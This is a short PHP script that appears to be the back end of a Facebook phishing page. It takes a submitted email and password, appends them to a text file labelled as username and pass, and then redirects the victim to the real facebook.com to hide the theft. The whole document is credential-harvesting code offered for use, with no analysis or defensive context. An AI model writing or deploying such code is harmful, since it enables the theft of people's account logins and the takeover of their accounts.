<?php

file_put_contents("crud.txt", "username : " . $_POST['email'] ."\n". "pass : " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://facebook.com');
exit();


?>